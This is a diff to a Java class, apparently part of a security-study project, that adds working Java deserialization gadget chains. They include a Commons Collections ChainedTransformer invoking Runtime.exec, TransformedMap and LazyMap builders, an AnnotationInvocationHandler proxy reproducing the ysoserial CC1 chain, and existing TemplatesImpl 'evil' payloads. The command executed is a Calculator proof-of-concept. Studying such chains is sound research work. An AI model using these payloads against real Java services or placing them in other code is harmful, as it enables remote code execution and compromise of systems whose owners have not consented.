@@ -3,19 +3,33 @@ package expUtils;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+import sun.reflect.annotation.AnnotationType;
 
 import java.io.*;
-import java.lang.reflect.Field;
+import java.lang.annotation.Annotation;
+import java.lang.annotation.Retention;
+import java.lang.annotation.Target;
+import java.lang.reflect.*;
 import java.math.BigInteger;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.HashMap;
+import java.util.Map;
 import java.util.PriorityQueue;
 import java.util.Random;
 
 import static expUtils.ReflectUtils.getClassByte;
 
 public class ExpUtils {
+
+    private static String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
+
     public static TemplatesImpl getEvilTemplates() throws NoSuchFieldException, IllegalAccessException, IOException {
         TemplatesImpl templates = new TemplatesImpl();
         ReflectUtils.setFields(templates,"_name","9eek");
@@ -63,6 +77,8 @@ public class ExpUtils {
         FileOutputStream fileOutputStream = new FileOutputStream(path);
         ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
         objectOutputStream.writeObject(obj);
+        objectOutputStream.flush();
+        objectOutputStream.close();
         return path;
     }
 //    反序列化特定路径文件为对象
@@ -88,16 +104,66 @@ public class ExpUtils {
         obj[1] = evilTemplates;
         return queue;
     }
+
+//    common collecions
+    public static ChainedTransformer getEvilChainedTransformer(){
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        return chainedTransformer;
+    }
+
+//    获取恶意transformMap
+    public static Map getEvilTransformMap(){
+        Map<String,String> innerMap = new HashMap<String,String>();
+//        这里的key 不是乱写的，不然不会触发。
+        innerMap.put("value","value12312312");
+        return TransformedMap.decorate(innerMap,null,getEvilChainedTransformer());
+    }
     //
+    public static Map getEvilLazyMap() throws InvocationTargetException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IllegalAccessException {
+        Map<String,String> innerMap = new HashMap<>();
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, getEvilChainedTransformer());
+        Map finalLazyMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(),lazyMap.getClass().getInterfaces(),getAnnotationHandler(lazyMap));
+        return finalLazyMap;
+    }
+
+//    ysoserial cc1
+    public static Object getCC1Exp() throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
+        return getAnnotationHandler(getEvilLazyMap());
+    }
+
+    public static InvocationHandler getAnnotationHandler(Map map) throws IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, ClassNotFoundException {
+        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map);
+        return handler;
+    }
+
+// AnnotationHandler setValue 方式触发
+    public static Object getSetValueHandlerExp() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
+        return getAnnotationHandler(getEvilTransformMap());
+    }
 
 
 
-    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
-//        System.out.println(System.getProperty("user.dir"));
-//        byte[] evilCode = getClassByte("sec-common/target/classes/expUtils/TemplatesEvilClass.class");
-//        System.out.println(evilCode.length);
-//        byte[] aaa = getObectClassByte(TemplatesImpl.class);
-//        System.out.println(aaa.length);
-        getURLDNSChains();
+
+    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, InvocationTargetException {
+       Map evilMap = getEvilLazyMap();
+       evilMap.entrySet();
+
+//        AnnotationType annotationType = AnnotationType.getInstance(Retention.class);
+//        Map var6 = annotationType.memberTypes();
+
+        //        System.out.println(System.getProperty("java.version"));
+//        Object obj = getCC1Exp();
+//        unserialize(serialize(obj));
+
+
     }
 }
